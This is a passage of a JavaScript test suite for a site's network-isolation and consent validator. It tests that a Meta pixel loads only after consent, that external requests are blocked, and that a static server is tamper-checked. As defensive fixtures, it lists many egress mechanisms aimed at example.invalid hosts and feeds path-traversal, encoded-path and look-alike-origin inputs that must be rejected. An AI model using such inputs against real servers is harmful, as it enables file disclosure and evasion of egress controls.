  const exposed = consumer.replace("async function installRuntimeNetworkPolicy", "void context.exposeBinding('__branctReportExternalAttempt', () => {});\nasync function installRuntimeNetworkPolicy");
  assert.notEqual(exposed, consumer, "page-realm authority mutation was a no-op");
  assert.throws(() => assertHostOnlyObservationAuthority(exposed), /observation binding|authority channel/i);
  const wrongRoute = consumer.replaceAll('route: "crm-gestao.html"', 'route: "index.html"').replaceAll("${origin}/crm-gestao.html", "${origin}/index.html");
  assert.notEqual(wrongRoute, consumer, "consent route mutation was a no-op");
  assert.throws(() => assertCanonicalConsentProbe(wrongRoute), /input did not match|crm-gestao/i);
  const withoutHostEvents = consumer.replace(/    recordExternalRequest\(request\);\r?\n/, "");
  assert.notEqual(withoutHostEvents, consumer, "host request observation mutation was a no-op");
  assert.doesNotMatch(withoutHostEvents, /context\.on\("request", \(request\) => \{\r?\n    recordLifecycleEvent\(`request:\$\{request\.resourceType\(\)\}`\);\r?\n    recordExternalRequest\(request\);\r?\n  \}\);/);
});

test("F2-GOV-09 mutation control proves the structural resource-hint parser is load-bearing", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-hint-mutation-"));
  try {
    const source = canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
    const weakened = source.replace("const attributes = parseLinkAttributes(tag, route);", "const attributes = new Map();");
    assert.notEqual(weakened, source, "resource-hint parser mutation was a no-op");
    const target = join(directory, "weakened-static-server.mjs");
    await writeFile(target, weakened);
    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
    assert.doesNotThrow(() => module.assertNoExternalResourceHints(Buffer.from("<link rel=preconnect href=https://tracker.invalid>"), "probe.html"));
  } finally { await rm(directory, { recursive: true, force: true }); }
});

test("F2-GOV-09 mutation control proves exact control observation binding is load-bearing", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-control-mutation-"));
  try {
    const source = canonicalBlob("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
    const weakened = source.replace(
      "assert.deepEqual(observed, expectedObservation, `${engineReport.engine}: trusted control observation is divergent: ${control.action}`);",
      "void expectedObservation;",
    );
    assert.notEqual(weakened, source, "control observation binding mutation was a no-op");
    const target = join(directory, "weakened-validator.mjs");
    await writeFile(target, weakened);
    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
    const fixture = canonicalOperationalFixture();
    fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "consent-loader").observed[0].mechanism = "fake";
    assert.doesNotThrow(() => module.validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest));
  } finally { await rm(directory, { recursive: true, force: true }); }
});

test("F2-GOV-09 accepts the real branct.js as inventoried capability rather than executed intent", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, "src/js/branct.js", canonicalBlob("src/js/branct.js"));
    fixture.git("add", "src/js/branct.js");
    await publishFixtureHead(fixture, "real branct.js capability inventory");
    assert.equal(run(fixture).decision, "PASS");
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-09-F3 has no unconditional Meta preconnect or script insertion", () => {
  const crm = canonicalBlob("crm-gestao.html").toString("utf8");
  assert.doesNotMatch(crm, /<link\s+rel=["']preconnect["'][^>]+connect\.facebook\.net/i);
  const withoutConsentGate = crm.replace(/<!-- ===== JS: Consent gate \+ Pixel[\s\S]*?<\/script>/, "");
  assert.doesNotMatch(withoutConsentGate, /fbevents\.js|connect\.facebook\.net/i);
});

test("F2-GOV-09-F3 does not load Meta without a decision or after refusal", () => {
  assert.deepEqual(runCrmConsentPage().attempts, []);
  assert.deepEqual(runCrmConsentPage(new Map(), "consent-reject").attempts, []);
});

test("F2-GOV-09-F3 loads Meta only after explicit or persisted valid consent", () => {
  const accepted = runCrmConsentPage(new Map(), "consent-accept");
  assert.deepEqual(accepted.attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }]);
  const persisted = new Map([["branct_consent", JSON.stringify({ status: "granted", version: "v1", ts: 1 })]]);
  assert.deepEqual(runCrmConsentPage(persisted).attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }]);
});

test("F2-GOV-09-F3 withdrawal prevents Meta on the next page load", () => {
  const storage = new Map([["branct_consent", JSON.stringify({ status: "granted", version: "v1", ts: 1 })]]);
  assert.equal(runCrmConsentPage(storage).attempts.length, 1);
  storage.delete("branct_consent");
  assert.deepEqual(runCrmConsentPage(storage).attempts, []);
});

test("F2-GOV-09-F3 mutation controls prove consent guards are load-bearing", () => {
  const crm = canonicalBlob("crm-gestao.html").toString("utf8");
  const forcedPersistedConsent = crm.replace(
    "if (stored && stored.status === 'granted' && stored.version === CONSENT_VER)",
    "if (true)",
  );
  assert.notEqual(forcedPersistedConsent, crm, "persisted-consent mutation was a no-op");
  assert.equal(runCrmConsentPage(new Map(), null, forcedPersistedConsent).attempts.length, 1, "missing persisted-consent guard escaped detection");

  const acceptWithoutLoad = crm.replace(
    /saveConsent\('granted'\);\r?\n        loadPixelAndInit\(\);/,
    "saveConsent('granted');",
  );
  assert.notEqual(acceptWithoutLoad, crm, "accept-handler mutation was a no-op");
  assert.equal(runCrmConsentPage(new Map(), "consent-accept", acceptWithoutLoad).attempts.length, 0, "accept path passed without exercising the loader");
});

test("F2-GOV-09-F3 seals crm-gestao.html as the only added live evolution path", () => {
  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
  const expected = [
    ".github/workflows/gate-integrity-sentinel.yml",
    ".github/workflows/universal-pr-gate.yml",
    "crm-gestao.html",
    "docs/audit/phase-2/governance/f2-gov-09-design.md",
    "docs/audit/phase-2/governance/f2-gov-09-handoff.md",
    "fixtures/audit/f2-01-ci-runtime.json",
    "fixtures/audit/f2-01-transition.json",
    "fixtures/audit/f2-gov-08-authority-manifest.json",
    "fixtures/audit/f2-gov-08-base-only-contract.json",
    "fixtures/audit/f2-gov-08-expectations.json",
    "fixtures/audit/f2-gov-08-matrix.json",
    "scripts/governance/f2-gov-08-consumer.mjs",
    "scripts/governance/f2-gov-08-static-server.mjs",
    "scripts/governance/validate-f2-gov-08.mjs",
    "tests/audit/f2-gov-02a.test.mjs",
    "tests/audit/f2-gov-02c.test.mjs",
    "tests/audit/f2-gov-08.test.mjs",
    "tests/audit/site-audit.test.mjs",
  ];
  const assertExactEvolutionSet = (source) => {
    const sealed = source.match(/const F2_GOV_09_EVOLUTION_PATHS = Object\.freeze\(\[([\s\S]*?)\]\);/)?.[1]
      .match(/"[^"]+"/g)?.map((entry) => JSON.parse(entry));
    assert.ok(sealed, "candidate evolution path set is absent");
    assert.deepEqual(sealed, expected, "candidate evolution path set is not the exact sealed F2-GOV-09 set");
    return sealed;
  };
  const sealed = assertExactEvolutionSet(validator);
  assert.equal(sealed.filter((path) => path === "fixtures/audit/f2-01-ci-runtime.json").length, 1, "canonical runtime authority is not sealed exactly once");
  for (const path of ["fixtures/audit/f2-01-ci-runtime-copy.json", "fixtures/audit/f2-01-ci-runtime.yml", "fixtures/audit/runtime.json"])
    assert.equal(sealed.includes(path), false, `similar runtime path entered the sealed evolution set: ${path}`);
  const runtimeLine = /  "fixtures\/audit\/f2-01-ci-runtime\.json",\r?\n/;
  const withoutRuntime = validator.replace(runtimeLine, "");
  assert.notEqual(withoutRuntime, validator, "missing-runtime mutation was a no-op");
  assert.throws(() => assertExactEvolutionSet(withoutRuntime), /exact sealed F2-GOV-09 set/, "runtime authority removal escaped the closed set");
  const withSimilarRuntime = validator.replace(runtimeLine, (line) => `${line}  "fixtures/audit/f2-01-ci-runtime-copy.json",${line.endsWith("\r\n") ? "\r\n" : "\n"}`);
  assert.notEqual(withSimilarRuntime, validator, "similar-runtime mutation was a no-op");
  assert.throws(() => assertExactEvolutionSet(withSimilarRuntime), /exact sealed F2-GOV-09 set/, "similar runtime path escaped the closed set");
  assert.equal(sealed.filter((path) => path === "crm-gestao.html").length, 1, "consent-hardened live path is not sealed exactly once");
  assert.equal(sealed.filter((path) => path.endsWith(".html") && !path.startsWith("docs/")).length, 1, "an unrelated live HTML path entered the evolution set");
  assert.ok(sealed.includes("fixtures/audit/f2-01-transition.json"), "one-shot live transition authority is not sealed");
  assert.ok(sealed.includes("tests/audit/site-audit.test.mjs"), "one-shot live transition validator is not sealed");
});

test("F2-GOV-09-F3 exercises browser-only network capabilities from the controlled origin", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.match(consumer, /action === "serviceWorker\.register"\) \{\s*policy\.setScope\(\{ phase: "control-probe", action, route: "src\/i18n\/pt\.json", viewport: "control" \}\);\s*await page\.goto\(`\$\{origin\}\/src\/i18n\/pt\.json`, \{ waitUntil: "load" \}\);\s*\}/);
  assert.match(consumer, /action === "serviceWorker\.register" && policy\.controlAttempts\.length === before\) policy\.recordTrustedControl\(action, url\);/);
  assert.match(consumer, /else await page\.goto\("about:blank"\);/);
});

test("F2-GOV-09-F3 isolates every runtime network control in a fresh page", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.doesNotMatch(consumer, /const probePage = await context\.newPage\(\);\s*const controls = \[\];/);
  assert.match(consumer, /for \(const action of NETWORK_CONTROL_ACTIONS\) \{[\s\S]*?const probeContext = await browser\.newContext[\s\S]*?const probePage = await probeContext\.newPage\(\);[\s\S]*?finally \{ if \(!probeContextClosed\) await probeContext\.close\(\); \}[\s\S]*?\}/);
});

test("F2-GOV-09 inventories dormant external capability without granting runtime execution", () => {
  assert.equal(typeof portableGuard.inventoryNetworkCapabilities, "function", "trusted static inventory is absent");
  const inventory = portableGuard.inventoryNetworkCapabilities(
    "src/js/dormant.js",
    Buffer.from("const endpoint='https://example.invalid'; function dormant(){ return fetch(endpoint); }\n"),
  );
  assert.ok(inventory.some(({ line, category, mechanism }) => line === 1 && category === "ACTIVE_API" && mechanism === "fetch"));
  assert.ok(inventory.some(({ line, category, mechanism }) => line === 1 && category === "EXTERNAL_LITERAL" && mechanism === "https-url"));
});

test("F2-GOV-09 inventories the real branct.js capabilities with canonical file and lines", () => {
  const inventory = portableGuard.inventoryNetworkCapabilities("src/js/branct.js", canonicalBlob("src/js/branct.js"));
  assert.ok(inventory.some(({ path, line, category, mechanism }) => path === "src/js/branct.js" && line === 124 && category === "ACTIVE_API" && mechanism === "fetch"));
  assert.ok(inventory.some(({ path, line, category, mechanism }) => path === "src/js/branct.js" && line === 397 && category === "ACTIVE_API" && mechanism === "fetch"));
  assert.ok(inventory.some(({ path, line, category, mechanism, reference }) => path === "src/js/branct.js" && line === 43 && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference.startsWith("https://connect.facebook.net/")));
  assert.ok(inventory.some(({ path, line, category, mechanism, reference }) => path === "src/js/branct.js" && line === 393 && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference.startsWith("https://n8n.branct.com/")));
});

for (const [mechanism, url] of [
  ["fetch", "https://example.invalid/direct"],
  ["fetch-computed", "https://example.invalid/computed"],
  ["XMLHttpRequest", "https://example.invalid/xhr"],
  ["WebSocket", "wss://example.invalid/socket"],
  ["EventSource", "https://example.invalid/events"],
  ["sendBeacon", "https://example.invalid/beacon"],
  ["serviceWorker.register", "https://example.invalid/sw.js"],
  ["script", "https://example.invalid/script.js"],
  ["dynamic-import", "https://example.invalid/module.js"],
  ["frame", "https://example.invalid/frame"],
  ["image", "https://example.invalid/image.png"],
  ["window.open", "https://example.invalid/popup"],
  ["location.assign", "https://example.invalid/assign"],
  ["location.replace", "https://example.invalid/replace"],
  ["location.href", "https://example.invalid/href"],
  ["consent-loader", "https://connect.facebook.invalid/pixel.js"],
  ["form-submit", "https://webhook.invalid/lead"],
]) test(`F2-GOV-09 rejects a blocked ${mechanism} attempt as a runtime finding`, () => {
  const fixture = canonicalOperationalFixture();
  fixture.report.reports[0].networkIsolation.flowAttempts = [{
    mechanism,
    url,
    origin: new URL(url).origin,
    phase: "measured-flow",
    engine: "chromium",
    action: "measure-responsive",
    route: "index.html",
    viewport: "390x844",
    disposition: "BLOCKED_BEFORE_EGRESS",
  }];
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    new RegExp(`observed external network attempt.*${mechanism.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}.*chromium.*measure-responsive`, "i"),
  );
});

test("F2-GOV-09 local request policy accepts only an exact verified candidate blob", () => {
  assert.equal(typeof trustedServer.validateTrustedStaticRequest, "function", "trusted local request validator is absent");
  const expected = new Map([["src/i18n/pt.json", { sha256: sha256ForTest(Buffer.from('{"ok":true}')), bytes: Buffer.from('{"ok":true}') }]]);
  assert.equal(trustedServer.validateTrustedStaticRequest("http://127.0.0.1:4173/src/i18n/pt.json", "http://127.0.0.1:4173", expected).route, "src/i18n/pt.json");
});

for (const [label, url, expected] of [
  ["traversal", "http://127.0.0.1:4173/../escape.html", /canonical path|unsafe|traversal/i],
  ["encoded path", "http://127.0.0.1:4173/src%2fi18n%2fpt.json", /encoded|canonical path/i],
  ["similar origin", "http://127.0.0.1.invalid:4173/src/i18n/pt.json", /origin/i],
  ["missing file", "http://127.0.0.1:4173/src/i18n/missing.json", /not an expected candidate blob/i],
]) test(`F2-GOV-09 local request policy rejects ${label}`, () => {
  assert.equal(typeof trustedServer.validateTrustedStaticRequest, "function", "trusted local request validator is absent");
  const expectedFiles = new Map([["src/i18n/pt.json", { sha256: "1".repeat(64) }]]);
  assert.throws(() => trustedServer.validateTrustedStaticRequest(url, "http://127.0.0.1:4173", expectedFiles), expected);
});

test("F2-GOV-09 trusted server serves verified local i18n without redirect and detects later tampering", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-server-"));
  const bytes = Buffer.from('{"ok":true}');
  await write(directory, "src/i18n/pt.json", bytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "src/i18n/pt.json", sha256: sha256ForTest(bytes) }], 0);
  try {
    const response = await fetch(`${server.origin}/src/i18n/pt.json?cache=busted`, { redirect: "manual" });
    assert.equal(response.status, 200);
    assert.equal(response.redirected, false);
    assert.deepEqual(await response.json(), { ok: true });
    await writeFile(join(directory, "src", "i18n", "pt.json"), '{"ok":false}');
    const tampered = await fetch(`${server.origin}/src/i18n/pt.json`, { redirect: "manual" });
    assert.equal(tampered.status, 404);
    assert.match(await tampered.text(), /changed after materialization/i);
  } finally {
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F11 serves a verified local byte range without accepting indeterminate browser status", async () => {
  assert.equal(typeof trustedConsumer.assertTrustedLocalResponseStatus, "function", "trusted local response status guard is absent");
  assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(200, "http://127.0.0.1/full"));
  assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(206, "http://127.0.0.1/range"));
  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(0, "http://127.0.0.1/indeterminate"), /status 0/i);
  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(404, "http://127.0.0.1/missing"), /status 404/i);

  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-range-"));
  const bytes = Buffer.from(Array.from({ length: 32 }, (_, index) => index));
  await write(directory, "media/fixture.webm", bytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "media/fixture.webm", sha256: sha256ForTest(bytes) }], 0);
  try {
    const response = await fetch(`${server.origin}/media/fixture.webm`, { headers: { range: "bytes=4-11" }, redirect: "manual" });
    assert.equal(response.status, 206);
    assert.equal(response.headers.get("accept-ranges"), "bytes");
    assert.equal(response.headers.get("content-range"), "bytes 4-11/32");
    assert.equal(response.headers.get("content-length"), "8");
    assert.deepEqual(Buffer.from(await response.arrayBuffer()), bytes.subarray(4, 12));
    assert.deepEqual(server.getRequestLog().filter(({ route }) => route === "media/fixture.webm").map(({ range, status, bytes, finished }) => ({ range, status, bytes, finished })), [
      { range: "bytes=4-11", status: 206, bytes: 8, finished: true },
    ]);

    const invalid = await fetch(`${server.origin}/media/fixture.webm`, { headers: { range: "bytes=99-100" }, redirect: "manual" });
    assert.equal(invalid.status, 416);
    assert.match(await invalid.text(), /range/i);
  } finally {
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F11 WebKit records browser media variability without promoting status zero", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-webkit-"));
  const htmlBytes = Buffer.from('<!doctype html><video id="media" preload="metadata" src="/media/fixture.webm"></video>');
  const mediaBytes = workingFile("src/img/crm-demo.webm");
  await write(directory, "index.html", htmlBytes);
  await write(directory, "media/fixture.webm", mediaBytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [
    { path: "index.html", sha256: sha256ForTest(htmlBytes) },
    { path: "media/fixture.webm", sha256: sha256ForTest(mediaBytes) },
  ], 0);
  const { webkit } = await import("playwright");
  const browser = await webkit.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const responses = [];
    const failures = [];
    context.on("response", (response) => {
      if (response.url().endsWith("/media/fixture.webm")) responses.push(response.status());
    });
    context.on("requestfailed", (request) => {
      if (request.url().endsWith("/media/fixture.webm")) failures.push(request.failure()?.errorText ?? "unknown");
    });
    await context.route("**", (route) => route.continue());
    const page = await context.newPage();
    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
    await page.waitForTimeout(750);
    const mediaState = await page.locator("#media").evaluate((media) => ({ readyState: media.readyState, networkState: media.networkState, errorCode: media.error?.code ?? null }));
    for (const status of responses) {
      if (status === 0) assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(status, `${server.origin}/media/fixture.webm`), /status 0/i);
      else assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(status, `${server.origin}/media/fixture.webm`));
    }
    assert.ok(failures.every((reason) => reason === "Load request cancelled"), `unexpected WebKit media failure: ${failures.join(", ")}`);
    assert.ok(Number.isInteger(mediaState.readyState) && Number.isInteger(mediaState.networkState), "WebKit media state is malformed");
    const records = server.getRequestLog().filter(({ route }) => route === "media/fixture.webm");
    assert.ok(records.length > 0, "trusted server did not observe the WebKit media request");
    assert.ok(records.every(({ status, bytes, finished }) => [200, 206].includes(status) && bytes > 0 && finished), "trusted server did not complete every verified WebKit media response");
    await context.close();
  } finally {
    await browser.close();
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F11-F1 rejects every unproven local request failure and accepts only the exact completed WebKit range", () => {
  assert.equal(typeof trustedConsumer.assertTrustedLocalFailureCorrelations, "function", "operational local failure correlator is absent");
  const requestId = "1".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const failure = { requestId, url, route: "media/fixture.webm", range: "bytes=0-", reason: "Load request cancelled" };
  const journalId = "a".repeat(64);
  const response = { requestId, url, route: "media/fixture.webm", range: "bytes=0-", status: 206, journalId };
  const journal = { sequence: 4, journalId, requestId, url: "/media/fixture.webm", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const accept = (overrides = {}) => trustedConsumer.assertTrustedLocalFailureCorrelations({
    engine: "webkit",
    failures: [failure],
    responses: [response],
    journal: [journal],
    journalWindow: { start: 4, end: 4 },
    ...overrides,
  });
  assert.doesNotThrow(() => accept());
  assert.throws(() => accept({ responses: [] }), /response.*absent|response cardinality/i);
  assert.throws(() => accept({ journal: [] }), /journal.*absent|journal cardinality/i);
  assert.throws(() => accept({ journal: [{ ...journal, finished: false }] }), /journal.*incomplete|finished/i);
  assert.throws(() => accept({ journal: [{ ...journal, absoluteUrl: `${url}?forged=1` }] }), /URL.*divergent/i);
  assert.throws(() => accept({ journal: [{ ...journal, route: "media/other.webm" }] }), /route.*divergent/i);
  assert.throws(() => accept({ journal: [{ ...journal, range: "bytes=1-" }] }), /range.*divergent/i);
  assert.throws(() => accept({ journal: [journal, { ...journal }] }), /journal.*cardinality|duplicated/i);
  assert.throws(() => accept({ journalWindow: { start: 5, end: 9 } }), /journal.*window|journal.*absent/i);
  assert.throws(() => accept({ failures: [{ ...failure, reason: "net::ERR_FAILED" }] }), /failure reason|cancel/i);
  assert.throws(() => accept({ responses: [{ ...response, status: 0 }] }), /status 0/i);
});

test("F2-GOV-09-F14 exposes the observed requestfailed reason before classifying a cancellation", () => {
  const requestId = "f".repeat(64);
  const journalId = "e".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const route = "media/fixture.webm";
  const range = "bytes=0-";
  const response = { requestId, url, route, range, status: 206, journalId };
  const journal = { sequence: 0, journalId, requestId, absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  assert.throws(
    () => trustedConsumer.assertTrustedLocalFailureCorrelations({
      engine: "chromium",
      failures: [{ requestId, url, route, range, reason: "F14_DIAGNOSTIC_REASON" }],
      responses: [response],
      journal: [journal],
      journalWindow: { start: 0, end: 0 },
    }),
    /F14_DIAGNOSTIC_REASON/,
    "the fail-closed diagnostic must expose the actual requestfailed reason before any reason can be authorized",
  );
});

test("F2-GOV-09-F14 accepts the measured Chromium cancellation only through complete server-owned proof", () => {
  const requestId = "1".repeat(64);
  const journalId = "a".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const route = "media/fixture.webm";
  const range = "bytes=0-";
  const failure = { requestId, url, route, range, reason: "net::ERR_ABORTED" };
  const response = { requestId, url, route, range, status: 206, journalId };
  const journal = { sequence: 4, journalId, requestId, absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const verify = (overrides = {}) => trustedConsumer.assertTrustedLocalFailureCorrelations({
    engine: "chromium",
    failures: [failure],
    responses: [response],
    journal: [journal],
    journalWindow: { start: 4, end: 4 },
    ...overrides,
  });
  assert.doesNotThrow(() => verify(), "the measured Chromium cancellation must be classified by structural proof rather than engine name");
  assert.throws(() => verify({ failures: [{ ...failure, reason: "net::ERR_FAILED" }] }), /reason.*not.*authorized|cancellation.*reason/i);
  assert.throws(() => verify({ failures: [{ ...failure, reason: "UNKNOWN_LOCAL_REQUEST_FAILURE" }] }), /reason.*not.*authorized|cancellation.*reason/i);
  assert.throws(() => verify({ responses: [] }), /response.*cardinality/i);
  assert.throws(() => verify({ responses: [{ ...response, status: 0, journalId: null }] }), /status 0/i);
  assert.throws(() => verify({ responses: [{ ...response, status: 200 }] }), /206/i);
  assert.throws(() => verify({ journal: [] }), /journal.*cardinality/i);
  assert.throws(() => verify({ journal: [journal, { ...journal }] }), /journal.*cardinality/i);
  assert.throws(() => verify({ journal: [{ ...journal, journalId: "b".repeat(64) }] }), /journal.*cardinality/i);
  assert.throws(() => verify({ journal: [{ ...journal, requestId: "2".repeat(64) }] }), /identity.*divergent/i);
  assert.throws(() => verify({ journal: [{ ...journal, absoluteUrl: `${url}?forged=1` }] }), /URL.*divergent/i);
  assert.throws(() => verify({ journal: [{ ...journal, route: "media/other.webm" }] }), /route.*divergent/i);
  assert.throws(() => verify({ journal: [{ ...journal, range: "bytes=1-" }] }), /range.*divergent/i);
  assert.throws(() => verify({ journal: [{ ...journal, status: 200 }] }), /status.*206/i);
  assert.throws(() => verify({ journal: [{ ...journal, finished: false }] }), /incomplete/i);
  assert.throws(() => verify({ journalWindow: { start: 5, end: 5 } }), /outside.*window/i);
});

test("F2-GOV-09-F14 binds a WebKit response without Playwright identity only through its unique server journal", () => {
  const windowId = "window-f14-journal-only";
  const requestId = "2".repeat(64);
  const journalId = "b".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const route = "media/fixture.webm";
  const range = "bytes=0-";
  const request = { requestId, url, route, range, resourceType: "media" };
  const observation = { requestId: null, url, route, range, status: 206, journalId, resourceType: "media" };
  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
    engine: "webkit",
    windowId,
    localRequests: [request],
    localResponses: [observation],
    localFailures: [],
    journal: [record],
    journalRejections: [],
    ...overrides,
  });
  assert.equal(verify().trustedResponses, 1, "the server journal must remain the sole identity authority");
  assert.throws(() => verify({ localResponses: [{ ...observation, journalId: null }] }), /journal identity.*absent|malformed/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, journalId: "c".repeat(64) }] }), /no bound journal|journal.*record|binding/i);
  assert.throws(() => verify({ localResponses: [observation, { ...observation }] }), /journal identity is duplicated|cardinality/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, requestId: "3".repeat(64) }] }), /unknown request identity/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, url: `${url}?forged=1` }] }), /URL.*divergent/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, route: "media/other.webm" }] }), /route.*divergent/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, range: "bytes=1-" }] }), /range.*divergent/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, status: 200 }] }), /status.*divergent/i);
  assert.throws(() => verify({ localResponses: [{ ...observation, status: 0 }] }), /status 0|indeterminate.*journal/i);
  assert.throws(() => verify({ journal: [{ ...record, requestId: null }] }), /extra|unattributed|identity.*absent/i);
  assert.throws(() => verify({ journal: [{ ...record, finished: false }] }), /incomplete/i);
  assert.throws(() => verify({ journal: [record, { ...record, sequence: 1, journalId: "d".repeat(64) }] }), /cardinality|duplicated|extra/i);
});

test("F2-GOV-09-F14 mutation controls keep cancellation reason and server journal binding load-bearing", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const assertGuards = (source) => {
    assert.match(source, /TRUSTED_LOCAL_CANCELLATION_REASONS\.has\(failure\.reason\)/);
    assert.doesNotMatch(source, /assert\.equal\(engine,\s*["']webkit["']/);
    assert.match(source, /validObservationByJournal\.get\(record\.journalId\)/);
    assert.match(source, /observation\.requestId !== null/);
    assert.match(source, /trusted local response journal identity is absent or malformed/);
    assert.match(source, /response\.status === 0/);
    assert.match(source, /collection\.seal\(fingerprint\)/);
    assert.match(source, /boundRequestByJournal\.has\(record\.journalId\)/);
  };
  assert.doesNotThrow(() => assertGuards(consumer));
  for (const [label, pattern, replacement] of [
    ["accept any reason", "TRUSTED_LOCAL_CANCELLATION_REASONS.has(failure.reason)", "true"],
    ["reinstate engine gate", "TRUSTED_LOCAL_CANCELLATION_REASONS.has(failure.reason)", 'engine === "webkit"'],
    ["trust browser request identity", "validObservationByJournal.get(record.journalId)", "validObservationByRequest.get(record.requestId)"],
    ["accept observation without journal", 'assert.match(response.journalId ?? "", /^[0-9a-f]{64}$/, `${engine}: trusted local response journal identity is absent or malformed`);', ""],
    ["promote status zero", "response.status === 0", "false"],
    ["remove seal", "collection.seal(fingerprint)", "void fingerprint"],
    ["relax journal cardinality", "boundRequestByJournal.has(record.journalId)", "false"],
  ]) {
    const mutated = consumer.replace(pattern, replacement);
    assert.notEqual(mutated, consumer, `${label} mutation did not alter bytes`);
    assert.throws(() => assertGuards(mutated), /input did not match|match the regular expression/i, `${label} mutation escaped`);
  }
});

test("F2-GOV-09-F11-F1 wires the operational policy to the trusted server journal and refuses headerless WebKit internals", async () => {
  assert.equal(typeof trustedConsumer.installRuntimeNetworkPolicy, "function", "operational runtime policy is not reviewable");
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-f1-webkit-"));
  const htmlBytes = Buffer.from('<!doctype html><video id="media" preload="metadata" src="/media/fixture.webm"></video>');
  const mediaBytes = workingFile("src/img/crm-demo.webm");
  await write(directory, "index.html", htmlBytes);
  await write(directory, "media/fixture.webm", mediaBytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [
    { path: "index.html", sha256: sha256ForTest(htmlBytes) },
    { path: "media/fixture.webm", sha256: sha256ForTest(mediaBytes) },
  ], 0);
  const { webkit } = await import("playwright");
  const browser = await webkit.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const policy = await trustedConsumer.installRuntimeNetworkPolicy(context, server, "webkit", "candidate-flow");
    const page = await context.newPage();
    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
    await page.waitForTimeout(750);
    await page.close();
    await context.close();
    const correlation = await policy.finalizeLocalFailureCorrelations();
    assert.equal(correlation.correlatedFailures, 0);
    assert.equal(policy.localFailures.length, 0);
    const refusedInternals = server.getRequestLog().filter(({ authorized, url, status }) => authorized === false && url === "/media/fixture.webm" && status === 403);
    assert.ok(refusedInternals.length >= 1, "headerless WebKit media requests were not explicitly refused");
    assert.ok(refusedInternals.every(({ bytes, finished }) => bytes === 0 && finished === true));
    assert.equal(correlation.refusedInternalRequests, refusedInternals.length, "every headerless WebKit media refusal must remain counted by the server-owned journal");
    const observedRefusals = policy.localResponses.filter(({ route }) => route === "media/fixture.webm");
    assert.ok(observedRefusals.every(({ requestId, rejectionId, status }) => requestId === null && /^[0-9a-f]{64}$/.test(rejectionId) && status === 403), "an observed WebKit internal refusal was not bound to its server-owned rejection identity");
  } finally {
    await browser.close();
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F12 collection lifecycle rejects events during and after sealing", () => {
  assert.equal(typeof trustedConsumer.createTrustedCollectionLifecycle, "function", "trusted collection lifecycle is absent");
  const lifecycle = trustedConsumer.createTrustedCollectionLifecycle("webkit candidate-flow");
  assert.equal(lifecycle.snapshot().state, "OPEN");
  lifecycle.recordEvent("request");
  lifecycle.beginQuiescence();
